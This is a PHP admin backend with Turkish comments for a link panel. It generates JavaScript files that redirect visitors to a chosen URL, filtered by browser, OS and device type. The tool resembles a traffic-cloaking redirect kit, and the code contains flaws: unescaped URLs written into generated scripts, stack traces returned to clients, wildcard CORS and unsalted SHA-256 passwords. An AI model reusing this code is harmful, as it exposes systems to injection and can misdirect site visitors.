<?php
// Hata raporlamayı aktif et
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Veritabanı bağlantısı
require_once __DIR__ . '/config.php';

// Oturum başlat
session_start();

// CORS ve JSON header'ları
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');

// AJAX isteği kontrolü
if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) !== 'xmlhttprequest') {
    http_response_code(403);
    die('Doğrudan erişim yasak');
}

// Login ve Logout dışındaki tüm işlemler için yetki kontrolü
$action = $_POST['action'] ?? '';
if (!isset($_SESSION['admin_id']) && !in_array($action, ['login', 'logout'])) {
    http_response_code(401);
    echo json_encode([
        'success' => false,
        'message' => 'Yetkisiz erişim',
        'redirect' => '/login'
    ]);
    exit;
}

// API isteklerini işle
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $action = $_POST['action'] ?? '';
        
        switch ($action) {
            case 'login':
                handleLogin();
                break;
            case 'logout':
                handleLogout();
                break;
            case 'add_link':
                handleAddLink();
                break;
            case 'change_username':
                handleChangeUsername();
                break;
            case 'change_password':
                handleChangePassword();
                break;
            case 'get_links':
                handleGetLinks();
                break;
            case 'toggle_link_status':
                handleToggleLinkStatus();
                break;
            case 'delete_link':
                handleDeleteLink();
                break;
            case 'get_link_details':
                handleGetLinkDetails();
                break;
            case 'update_link':
                handleUpdateLink();
                break;
            default:
                throw new Exception('Geçersiz işlem');
        }
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => $e->getMessage(),
            'debug' => [
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString()
            ]
        ]);
    }
}

// Login işlemi
function handleLogin() {
    try {
        // Gerekli alanları kontrol et
        if (empty($_POST['username']) || empty($_POST['password'])) {
            throw new Exception('Kullanıcı adı ve şifre gereklidir');
        }

        $username = trim($_POST['username']);
        $password = trim($_POST['password']);
        $remember = isset($_POST['remember']) ? true : false;

        // Veritabanı bağlantısı
        $db = db();
        
        // Kullanıcıyı kontrol et
        $stmt = $db->prepare("SELECT id, username FROM admins WHERE username = :username AND password = SHA2(:password, 256) LIMIT 1");
        $stmt->execute([
            'username' => $username,
            'password' => $password
        ]);
        
        $admin = $stmt->fetch();

        if ($admin) {
            // Oturum başlat
            $_SESSION['admin_id'] = $admin['id'];
            $_SESSION['admin_username'] = $admin['username'];
            
            // Beni hatırla
            if ($remember) {
                $token = bin2hex(random_bytes(32));
                setcookie('remember_token', $token, time() + (86400 * 30), '/', '', true, true);
                
                // Token'ı veritabanına kaydet (opsiyonel)
                // $stmt = $db->prepare("UPDATE admins SET remember_token = :token WHERE id = :id");
                // $stmt->execute(['token' => $token, 'id' => $admin['id']]);
            }

            echo json_encode([
                'success' => true,
                'message' => 'Giriş başarılı',
                'redirect' => '/dashboard'
            ]);
        } else {
            throw new Exception('Kullanıcı adı veya şifre hatalı');
        }
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => $e->getMessage()
        ]);
    }
}

// Çıkış işlemi
function handleLogout() {
    session_destroy();
    setcookie('remember_token', '', time() - 3600, '/');
    echo json_encode([
        'success' => true,
        'message' => 'Çıkış yapıldı',
        'redirect' => '/login'
    ]);
}

// Link ekleme işlemi
function handleAddLink() {
    try {
        // Oturum kontrolü
        if (!isset($_SESSION['admin_id'])) {
            throw new Exception('Bu işlem için yetkiniz yok');
        }

        // Gerekli alanları kontrol et
        if (empty($_POST['link_url']) || empty($_POST['urlredgrim_url'])) {
            throw new Exception('Link URL ve urlredgrim URL alanları zorunludur');
        }

        // URL formatlarını kontrol et
        if (!filter_var($_POST['link_url'], FILTER_VALIDATE_URL)) {
            throw new Exception('Geçersiz Link URL formatı');
        }
        if (!filter_var($_POST['urlredgrim_url'], FILTER_VALIDATE_URL)) {
            throw new Exception('Geçersiz urlredgrim URL formatı');
        }

        // Random dosya adı oluştur (10 karakter)
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $filename = '';
        for($i = 0; $i < 10; $i++) {
            $filename .= $chars[rand(0, strlen($chars) - 1)];
        }
        $filename .= '.js';

        // JS dosyası içeriğini oluştur
        $jsContent = "(function() {\n";
        $jsContent .= "    var active = " . (isset($_POST['active']) && $_POST['active'] == 1 ? 'true' : 'false') . ";\n";
        $jsContent .= "    if(!active) { return; }\n\n";
        
        $jsContent .= "    var ua = navigator.userAgent.toLowerCase();\n";
        $jsContent .= "    var os = navigator.platform.toLowerCase();\n";
        $jsContent .= "    var isMobile = /(android|iphone|ipad|ipod|mobile)/i.test(navigator.userAgent);\n\n";

        // Platform kontrolü (Mobil/Desktop)
        if (isset($_POST['mobile_off']) && $_POST['mobile_off'] == 1) {
            $jsContent .= "    if(!isMobile) {\n";
        } else if (isset($_POST['desktop_off']) && $_POST['desktop_off'] == 1) {
            $jsContent .= "    if(isMobile) {\n";
        } else {
            $jsContent .= "    if(true) {\n";
        }

        // Browser kontrolü
        if (!empty($_POST['browser'])) {
            $browsers = json_decode($_POST['browser']);
            $browserConditions = [];
            
            foreach ($browsers as $b) {
                switch ($b) {
                    case 'chrome':
                        $browserConditions[] = "(ua.indexOf('chrome')>-1 && ua.indexOf('safari')>-1)";
                        break;
                    case 'firefox':
                        $browserConditions[] = "ua.indexOf('firefox')>-1";
                        break;
                    case 'safari':
                        $browserConditions[] = "(ua.indexOf('safari')>-1 && ua.indexOf('chrome')===-1)";
                        break;
                    case 'edge':
                        $browserConditions[] = "ua.indexOf('edg')>-1";
                        break;
                    case 'opera':
                        $browserConditions[] = "(ua.indexOf('opr')>-1 || ua.indexOf('opera')>-1)";
                        break;
                }
            }
            
            if (!empty($browserConditions)) {
                $jsContent .= "        if(" . implode(" || ", $browserConditions) . ") {\n";
            } else {
                $jsContent .= "        if(true) {\n";
            }
        } else {
            $jsContent .= "        if(true) {\n";
        }

        // OS kontrolü
        if (!empty($_POST['os_system'])) {
            $systems = json_decode($_POST['os_system']);
            $osConditions = [];
            
            foreach ($systems as $os) {
                switch ($os) {
                    case 'windows':
                        $osConditions[] = "os.indexOf('win')>-1";
                        break;
                    case 'macos':
                        $osConditions[] = "os.indexOf('mac')>-1";
                        break;
                    case 'linux':
                        $osConditions[] = "os.indexOf('linux')>-1";
                        break;
                    case 'android':
                        $osConditions[] = "/(android)/i.test(navigator.userAgent)";
                        break;
                    case 'ios':
                        $osConditions[] = "/(iphone|ipad|ipod)/i.test(navigator.userAgent)";
                        break;
                }
            }
            
            if (!empty($osConditions)) {
                $jsContent .= "            if(" . implode(" || ", $osConditions) . ") {\n";
            } else {
                $jsContent .= "            if(true) {\n";
            }
        } else {
            $jsContent .= "            if(true) {\n";
        }

        // Yönlendirme gecikmesi
        $redirect_delay = isset($_POST['redirect_delay']) ? (int)$_POST['redirect_delay'] : 0;
        if ($redirect_delay > 0) {
            $jsContent .= "                setTimeout(function() { window.location.href = '" . $_POST['urlredgrim_url'] . "'; }, " . ($redirect_delay * 1000) . ");\n";
        } else {
            $jsContent .= "                window.location.href = '" . $_POST['urlredgrim_url'] . "';\n";
        }

        $jsContent .= "            }\n";  // OS kontrolü sonu
        $jsContent .= "        }\n";      // Browser kontrolü sonu
        $jsContent .= "    }\n";          // Platform kontrolü sonu
        $jsContent .= "})();";

        // JS dosyasını kaydet
        $jsPath = __DIR__ . '/../js/' . $filename;
        if (!file_put_contents($jsPath, $jsContent)) {
            throw new Exception('JS dosyası oluşturulamadı');
        }

        // JS URL'ini oluştur
        $jsUrl = '/js/' . $filename;

        // Veritabanı bağlantısı
        $db = db();
        
        // Browser ve OS System değerlerini JSON olarak sakla
        $browser = !empty($_POST['browser']) ? json_encode($_POST['browser']) : null;
        $os_system = !empty($_POST['os_system']) ? json_encode($_POST['os_system']) : null;
        
        // Linki ekle
        $stmt = $db->prepare("
            INSERT INTO links (
                link_url, 
                js_url,
                urlredgrim_url, 
                browser, 
                os_system, 
                mobile_off, 
                desktop_off,
                redirect_delay,
                active
            ) VALUES (
                :link_url,
                :js_url,
                :urlredgrim_url,
                :browser,
                :os_system,
                :mobile_off,
                :desktop_off,
                :redirect_delay,
                :active
            )
        ");

        $stmt->execute([
            'link_url' => $_POST['link_url'],
            'js_url' => $jsUrl,
            'urlredgrim_url' => $_POST['urlredgrim_url'],
            'browser' => $browser,
            'os_system' => $os_system,
            'mobile_off' => isset($_POST['mobile_off']) ? (int)$_POST['mobile_off'] : 0,
            'desktop_off' => isset($_POST['desktop_off']) ? (int)$_POST['desktop_off'] : 0,
            'redirect_delay' => isset($_POST['redirect_delay']) ? (int)$_POST['redirect_delay'] : 0,
            'active' => isset($_POST['active']) ? (int)$_POST['active'] : 1
        ]);

        echo json_encode([
            'success' => true,
            'message' => 'Link başarıyla eklendi'
        ]);
        exit;
    } catch (Exception $e) {
        // JS dosyası oluşturulduysa sil
        if (isset($jsPath) && file_exists($jsPath)) {
            unlink($jsPath);
        }
        
        echo json_encode([
            'success' => false,
            'message' => 'Link eklenirken bir hata oluştu: ' . $e->getMessage()
        ]);
        exit;
    }
}

// Kullanıcı adı değiştirme
function handleChangeUsername() {
    if (!isset($_SESSION['admin_id'])) {
        echo json_encode(['success' => false, 'message' => 'Oturum açmanız gerekiyor']);
        exit;
    }

    $newUsername = $_POST['new_username'] ?? '';
    $currentPassword = $_POST['current_password'] ?? '';

    // Boş alan kontrolü
    if (empty($newUsername) || empty($currentPassword)) {
        echo json_encode(['success' => false, 'message' => 'Tüm alanları doldurun']);
        exit;
    }

    // Veritabanı bağlantısı
    $db = db();

    // Mevcut kullanıcı adını kontrol et
    $stmt = $db->prepare("SELECT username FROM admins WHERE id = ?");
    $stmt->execute([$_SESSION['admin_id']]);
    $currentUser = $stmt->fetch(PDO::FETCH_ASSOC);

    // Aynı kullanıcı adını yazdıysa değiştirme
    if ($currentUser['username'] === $newUsername) {
        echo json_encode(['success' => false, 'message' => 'Yeni kullanıcı adı mevcut kullanıcı adı ile aynı']);
        exit;
    }

    // Mevcut şifreyi kontrol et
    $stmt = $db->prepare("SELECT id FROM admins WHERE id = ? AND password = SHA2(?, 256)");
    $stmt->execute([$_SESSION['admin_id'], $currentPassword]);
    $admin = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$admin) {
        echo json_encode(['success' => false, 'message' => 'Mevcut şifre yanlış']);
        exit;
    }

    // Kullanıcı adının başka biri tarafından kullanılıp kullanılmadığını kontrol et
    $stmt = $db->prepare("SELECT id FROM admins WHERE username = ? AND id != ?");
    $stmt->execute([$newUsername, $_SESSION['admin_id']]);
    $existingUser = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($existingUser) {
        echo json_encode(['success' => false, 'message' => 'Bu kullanıcı adı zaten kullanılıyor']);
        exit;
    }

    // Kullanıcı adını güncelle
    $stmt = $db->prepare("UPDATE admins SET username = ? WHERE id = ?");
    $stmt->execute([$newUsername, $_SESSION['admin_id']]);
    
    // Oturumu kapat
    session_destroy();
    setcookie('remember_token', '', time() - 3600, '/');
    
    echo json_encode([
        'success' => true, 
        'message' => 'Kullanıcı adı başarıyla güncellendi. Lütfen tekrar giriş yapın.',
        'redirect' => '/login'
    ]);
    exit;
}

// Şifre değiştirme
function handleChangePassword() {
    if (!isset($_SESSION['admin_id'])) {
        echo json_encode(['success' => false, 'message' => 'Oturum açmanız gerekiyor']);
        exit;
    }

    $currentPassword = $_POST['current_password'] ?? '';
    $newPassword = $_POST['new_password'] ?? '';
    $confirmPassword = $_POST['confirm_password'] ?? '';

    // Boş alan kontrolü
    if (empty($currentPassword) || empty($newPassword) || empty($confirmPassword)) {
        echo json_encode(['success' => false, 'message' => 'Tüm alanları doldurun']);
        exit;
    }

    // Şifre uzunluğu kontrolü
    if (strlen($newPassword) < 8) {
        echo json_encode(['success' => false, 'message' => 'Yeni şifre en az 8 karakter olmalıdır']);
        exit;
    }

    // Yeni şifrelerin eşleşip eşleşmediğini kontrol et
    if ($newPassword !== $confirmPassword) {
        echo json_encode(['success' => false, 'message' => 'Yeni şifreler eşleşmiyor']);
        exit;
    }

    // Veritabanı bağlantısı
    $db = db();

    // Mevcut şifreyi kontrol et
    $stmt = $db->prepare("SELECT id FROM admins WHERE id = ? AND password = SHA2(?, 256)");
    $stmt->execute([$_SESSION['admin_id'], $currentPassword]);
    $admin = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$admin) {
        echo json_encode(['success' => false, 'message' => 'Mevcut şifre yanlış']);
        exit;
    }

    // Yeni şifrenin mevcut şifre ile aynı olup olmadığını kontrol et
    $stmt = $db->prepare("SELECT id FROM admins WHERE id = ? AND password = SHA2(?, 256)");
    $stmt->execute([$_SESSION['admin_id'], $newPassword]);
    $samePassword = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($samePassword) {
        echo json_encode(['success' => false, 'message' => 'Yeni şifre mevcut şifre ile aynı olamaz']);
        exit;
    }

    // Şifreyi güncelle
    $stmt = $db->prepare("UPDATE admins SET password = SHA2(?, 256) WHERE id = ?");
    $stmt->execute([$newPassword, $_SESSION['admin_id']]);
    
    // Oturumu kapat
    session_destroy();
    setcookie('remember_token', '', time() - 3600, '/');
    
    echo json_encode([
        'success' => true, 
        'message' => 'Şifre başarıyla güncellendi. Lütfen tekrar giriş yapın.',
        'redirect' => '/login'
    ]);
    exit;
}

// Yeni fonksiyonlar
function handleGetLinks() {
    try {
        if (!isset($_SESSION['admin_id'])) {
            throw new Exception('Bu işlem için yetkiniz yok');
        }

        $page = isset($_POST['page']) ? (int)$_POST['page'] : 1;
        $limit = 10;
        $offset = ($page - 1) * $limit;
        $search = isset($_POST['search']) ? trim($_POST['search']) : '';

        $db = db();
        
        // Toplam kayıt sayısını al
        $countQuery = "SELECT COUNT(*) as total FROM links WHERE 1=1";
        if (!empty($search)) {
            $countQuery .= " AND (link_url LIKE :search OR urlredgrim_url LIKE :search OR js_url LIKE :search)";
        }
        
        $stmt = $db->prepare($countQuery);
        if (!empty($search)) {
            $stmt->execute(['search' => "%{$search}%"]);
        } else {
            $stmt->execute();
        }
        
        $total = $stmt->fetch()['total'];
        $totalPages = ceil($total / $limit);

        // Linkleri al
        $query = "SELECT * FROM links WHERE 1=1";
        if (!empty($search)) {
            $query .= " AND (link_url LIKE :search OR urlredgrim_url LIKE :search OR js_url LIKE :search)";
        }
        $query .= " ORDER BY id DESC LIMIT :limit OFFSET :offset";

        $stmt = $db->prepare($query);
        $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
        $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
        if (!empty($search)) {
            $stmt->bindValue(':search', "%{$search}%");
        }
        $stmt->execute();

        $links = $stmt->fetchAll();

        echo json_encode([
            'success' => true,
            'links' => $links,
            'current_page' => $page,
            'total_pages' => $totalPages
        ]);
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => $e->getMessage()
        ]);
    }
}

function handleToggleLinkStatus() {
    try {
        if (!isset($_SESSION['admin_id'])) {
            throw new Exception('Bu işlem için yetkiniz yok');
        }

        if (!isset($_POST['id']) || !isset($_POST['status'])) {
            throw new Exception('Gerekli parametreler eksik');
        }

        $id = (int)$_POST['id'];
        $status = (int)$_POST['status'];

        $db = db();
        $stmt = $db->prepare("UPDATE links SET active = :status WHERE id = :id");
        $stmt->execute([
            'id' => $id,
            'status' => $status
        ]);

        echo json_encode([
            'success' => true,
            'message' => 'Link durumu güncellendi'
        ]);
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => $e->getMessage()
        ]);
    }
}

function handleDeleteLink() {
    try {
        if (!isset($_SESSION['admin_id'])) {
            throw new Exception('Bu işlem için yetkiniz yok');
        }

        if (!isset($_POST['id'])) {
            throw new Exception('Gerekli parametreler eksik');
        }

        $id = (int)$_POST['id'];
        $db = db();
        
        // Önce JS dosyasını bul
        $stmt = $db->prepare("SELECT js_url FROM links WHERE id = :id");
        $stmt->execute(['id' => $id]);
        $link = $stmt->fetch();

        if ($link) {
            // JS dosyasını sil
            $jsPath = __DIR__ . '/..' . $link['js_url'];
            if (file_exists($jsPath)) {
                unlink($jsPath);
            }

            // Linki veritabanından sil
            $stmt = $db->prepare("DELETE FROM links WHERE id = :id");
            $stmt->execute(['id' => $id]);

            echo json_encode([
                'success' => true,
                'message' => 'Link ve JS dosyası başarıyla silindi'
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'message' => 'Link bulunamadı'
            ]);
        }
        exit;
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => 'Link silinirken bir hata oluştu: ' . $e->getMessage()
        ]);
        exit;
    }
}

// Link detaylarını getir
function handleGetLinkDetails() {
    try {
        $db = db();
        $id = $_POST['id'] ?? null;

        if (!$id) {
            echo json_encode([
                'success' => false,
                'message' => 'Link ID gerekli'
            ]);
            exit;
        }

        $stmt = $db->prepare("SELECT * FROM links WHERE id = ?");
        $stmt->execute([$id]);
        $link = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$link) {
            echo json_encode([
                'success' => false,
                'message' => 'Link bulunamadı'
            ]);
            exit;
        }

        // Platform ve aktiflik durumunu integer'a çevir
        $link['mobile_off'] = (int)$link['mobile_off'];
        $link['desktop_off'] = (int)$link['desktop_off'];
        $link['active'] = (int)$link['active'];
        $link['redirect_delay'] = (int)$link['redirect_delay'];

        echo json_encode([
            'success' => true,
            'link' => $link
        ]);
        exit;
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => 'Link bilgileri yüklenirken bir hata oluştu'
        ]);
        exit;
    }
}

// Link güncelle
function handleUpdateLink() {
    try {
        $db = db();
        $id = $_POST['id'] ?? null;
        $link_url = $_POST['link_url'] ?? '';
        $urlredgrim_url = $_POST['urlredgrim_url'] ?? '';
        $browser = $_POST['browser'] ?? '[]';
        $os_system = $_POST['os_system'] ?? '[]';
        $mobile_off = isset($_POST['mobile_off']) ? (int)$_POST['mobile_off'] : 0;
        $desktop_off = isset($_POST['desktop_off']) ? (int)$_POST['desktop_off'] : 0;
        $active = isset($_POST['active']) ? (int)$_POST['active'] : 1;
        $redirect_delay = isset($_POST['redirect_delay']) ? (int)$_POST['redirect_delay'] : 0;

        if (!$id || !$link_url || !$urlredgrim_url) {
            throw new Exception('Gerekli alanları doldurun');
        }

        // Platform kontrolü
        if ($mobile_off && $desktop_off) {
            throw new Exception('Mobil ve masaüstü aynı anda kapalı olamaz');
        }

        // Önce mevcut linki al
        $stmt = $db->prepare("SELECT * FROM links WHERE id = ?");
        $stmt->execute([$id]);
        $currentLink = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$currentLink) {
            throw new Exception('Link bulunamadı');
        }

        // JS dosyası içeriğini oluştur
        $jsContent = "(function() {\n";
        $jsContent .= "    var active = " . ($active ? 'true' : 'false') . ";\n";
        $jsContent .= "    if(!active) { return; }\n\n";
        
        $jsContent .= "    var ua = navigator.userAgent.toLowerCase();\n";
        $jsContent .= "    var os = navigator.platform.toLowerCase();\n";
        $jsContent .= "    var isMobile = /(android|iphone|ipad|ipod|mobile)/i.test(navigator.userAgent);\n\n";

        // Platform kontrolü (Mobil/Desktop)
        if (isset($_POST['mobile_off']) && $_POST['mobile_off'] == 1) {
            $jsContent .= "    if(!isMobile) {\n";
        } else if (isset($_POST['desktop_off']) && $_POST['desktop_off'] == 1) {
            $jsContent .= "    if(isMobile) {\n";
        } else {
            $jsContent .= "    if(true) {\n";
        }

        // Browser kontrolü
        if (!empty($_POST['browser'])) {
            $browsers = json_decode($browser);
            $browserConditions = [];
            foreach ($browsers as $b) {
                switch ($b) {
                    case 'chrome':
                        $browserConditions[] = "(ua.indexOf('chrome')>-1 && ua.indexOf('safari')>-1)";
                        break;
                    case 'firefox':
                        $browserConditions[] = "ua.indexOf('firefox')>-1";
                        break;
                    case 'safari':
                        $browserConditions[] = "(ua.indexOf('safari')>-1 && ua.indexOf('chrome')===-1)";
                        break;
                    case 'edge':
                        $browserConditions[] = "ua.indexOf('edg')>-1";
                        break;
                    case 'opera':
                        $browserConditions[] = "(ua.indexOf('opr')>-1 || ua.indexOf('opera')>-1)";
                        break;
                }
            }
            if (!empty($browserConditions)) {
                $jsContent .= "        if(" . implode(" || ", $browserConditions) . ") {\n";
            } else {
                $jsContent .= "        if(true) {\n";
            }
        } else {
            $jsContent .= "        if(true) {\n";
        }

        // OS kontrolü
        if (!empty($_POST['os_system'])) {
            $systems = json_decode($os_system);
            $osConditions = [];
            foreach ($systems as $os) {
                switch ($os) {
                    case 'windows':
                        $osConditions[] = "os.indexOf('win')>-1";
                        break;
                    case 'macos':
                        $osConditions[] = "os.indexOf('mac')>-1";
                        break;
                    case 'linux':
                        $osConditions[] = "os.indexOf('linux')>-1";
                        break;
                    case 'android':
                        $osConditions[] = "/(android)/i.test(navigator.userAgent)";
                        break;
                    case 'ios':
                        $osConditions[] = "/(iphone|ipad|ipod)/i.test(navigator.userAgent)";
                        break;
                }
            }
            if (!empty($osConditions)) {
                $jsContent .= "            if(" . implode(" || ", $osConditions) . ") {\n";
            } else {
                $jsContent .= "            if(true) {\n";
            }
        } else {
            $jsContent .= "            if(true) {\n";
        }

        // Yönlendirme gecikmesi
        if ($redirect_delay > 0) {
            $jsContent .= "                setTimeout(function() { window.location.href = '" . $urlredgrim_url . "'; }, " . ($redirect_delay * 1000) . ");\n";
        } else {
            $jsContent .= "                window.location.href = '" . $urlredgrim_url . "';\n";
        }

        $jsContent .= "            }\n";  // OS kontrolü sonu
        $jsContent .= "        }\n";      // Browser kontrolü sonu
        $jsContent .= "    }\n";          // Platform kontrolü sonu
        $jsContent .= "})();";

        // JS dosyasını güncelle
        $jsPath = __DIR__ . '/..' . $currentLink['js_url'];
        if (!file_put_contents($jsPath, $jsContent)) {
            throw new Exception('JS dosyası güncellenemedi');
        }

        // Linki güncelle
        $stmt = $db->prepare("UPDATE links SET 
            link_url = ?, 
            urlredgrim_url = ?, 
            browser = ?, 
            os_system = ?, 
            mobile_off = ?, 
            desktop_off = ?, 
            active = ?,
            redirect_delay = ?
            WHERE id = ?");

        $result = $stmt->execute([
            $link_url,
            $urlredgrim_url,
            $browser,
            $os_system,
            $mobile_off,
            $desktop_off,
            $active,
            $redirect_delay,
            $id
        ]);

        if ($result) {
            // Güncellenmiş link bilgilerini al
            $stmt = $db->prepare("SELECT * FROM links WHERE id = ?");
            $stmt->execute([$id]);
            $updatedLink = $stmt->fetch(PDO::FETCH_ASSOC);

            // Integer dönüşümlerini yap
            $updatedLink['mobile_off'] = (int)$updatedLink['mobile_off'];
            $updatedLink['desktop_off'] = (int)$updatedLink['desktop_off'];
            $updatedLink['active'] = (int)$updatedLink['active'];
            $updatedLink['redirect_delay'] = (int)$updatedLink['redirect_delay'];

            echo json_encode([
                'success' => true,
                'message' => 'Link başarıyla güncellendi',
                'link' => $updatedLink
            ]);
            exit;
        } else {
            throw new Exception('Link güncellenirken bir hata oluştu');
        }
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => 'Link güncellenirken bir hata oluştu: ' . $e->getMessage()
        ]);
        exit;
    }
}

class API {
    private $db;

    public function __construct() {
        $this->db = db();
    }

    // Kullanıcı girişi
    public function login($username, $password) {
        try {
            $stmt = $this->db->prepare("SELECT * FROM users WHERE username = :username LIMIT 1");
            $stmt->execute(['username' => $username]);
            $user = $stmt->fetch();

            if ($user && password_verify($password, $user['password'])) {
                $_SESSION['user_id'] = $user['id'];
                $_SESSION['username'] = $user['username'];
                return ['success' => true, 'message' => 'Giriş başarılı'];
            }

            return ['success' => false, 'message' => 'Kullanıcı adı veya şifre hatalı'];
        } catch (Exception $e) {
            return ['success' => false, 'message' => 'Bir hata oluştu: ' . $e->getMessage()];
        }
    }

    // Kullanıcı çıkışı
    public function logout() {
        session_destroy();
        return ['success' => true, 'message' => 'Çıkış yapıldı'];
    }

    // Kullanıcı kontrolü
    public function isLoggedIn() {
        return isset($_SESSION['user_id']);
    }

    // Kullanıcı bilgilerini getir
    public function getUserInfo($userId = null) {
        $userId = $userId ?? $_SESSION['user_id'] ?? null;
        
        if (!$userId) {
            return null;
        }

        try {
            $stmt = $this->db->prepare("SELECT id, username, email, created_at FROM users WHERE id = :id LIMIT 1");
            $stmt->execute(['id' => $userId]);
            return $stmt->fetch();
        } catch (Exception $e) {
            return null;
        }
    }

    // Yeni kullanıcı oluştur
    public function createUser($username, $password, $email) {
        try {
            $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
            
            $stmt = $this->db->prepare("
                INSERT INTO users (username, password, email, created_at) 
                VALUES (:username, :password, :email, NOW())
            ");
            
            $stmt->execute([
                'username' => $username,
                'password' => $hashedPassword,
                'email' => $email
            ]);

            return ['success' => true, 'message' => 'Kullanıcı oluşturuldu'];
        } catch (Exception $e) {
            return ['success' => false, 'message' => 'Bir hata oluştu: ' . $e->getMessage()];
        }
    }

    // Şifre güncelle
    public function updatePassword($userId, $currentPassword, $newPassword) {
        try {
            $stmt = $this->db->prepare("SELECT password FROM users WHERE id = :id LIMIT 1");
            $stmt->execute(['id' => $userId]);
            $user = $stmt->fetch();

            if (!$user || !password_verify($currentPassword, $user['password'])) {
                return ['success' => false, 'message' => 'Mevcut şifre hatalı'];
            }

            $hashedPassword = password_hash($newPassword, PASSWORD_DEFAULT);
            
            $stmt = $this->db->prepare("UPDATE users SET password = :password WHERE id = :id");
            $stmt->execute([
                'password' => $hashedPassword,
                'id' => $userId
            ]);

            return ['success' => true, 'message' => 'Şifre güncellendi'];
        } catch (Exception $e) {
            return ['success' => false, 'message' => 'Bir hata oluştu: ' . $e->getMessage()];
        }
    }

    // CSRF token oluştur
    public function generateCSRFToken() {
        if (empty($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }

    // CSRF token kontrolü
    public function validateCSRFToken($token) {
        if (!isset($_SESSION['csrf_token']) || $token !== $_SESSION['csrf_token']) {
            return false;
        }
        return true;
    }
}

// Global API instance
function api() {
    static $api = null;
    if ($api === null) {
        $api = new API();
    }
    return $api;
}

// Örnek kullanım:
// $api = api();
// $loginResult = $api->login('username', 'password');
?> 